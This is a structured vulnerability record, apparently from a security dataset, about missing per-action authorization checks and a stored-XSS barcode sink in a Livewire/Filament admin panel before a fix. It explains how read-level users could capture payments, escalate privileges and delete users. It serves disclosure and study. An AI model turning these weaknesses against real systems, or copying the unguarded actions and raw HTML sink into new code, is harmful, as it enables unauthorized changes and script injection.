mechanism.summary: On the pre-fix tree (fcd0c592^), low-privilege authenticated admin panel users could invoke Livewire/Filament mutation actions that had no per-action authorization: the order-detail actions only required read_orders at mount, the shipment table actions only browse_orders, product sub-form store() methods had no guard at all, Team/Index had no mount() guard, RolePermission writes accepted the read-only view_users, payment/currency/carrier toggles were unchecked, Customers/Create re-passed a Hidden _password, public Eloquent model properties were unlocked (client-side ID tampering), and product barcode input reached a raw {!! DNS1DFacade::getBarcodeHTML() !!} sink as stored XSS. The impact is unauthorized order state changes including real PSP capture and cancellation, shipment/tracking manipulation, product and settings mutation, RBAC privilege escalation, user deletion, and stored XSS. The vulnerable components were reachable with at least read-level access to the owning page (or, for the product sub-forms, as separately addressable Livewire components with unlocked model ids).
mechanism.trigger: An authenticated panel user opens (or mounts) the affected Livewire component with only read-level permission and triggers a table row action, form submit or modal action; no per-action permission check ran, so the mutation executed with the user's session.
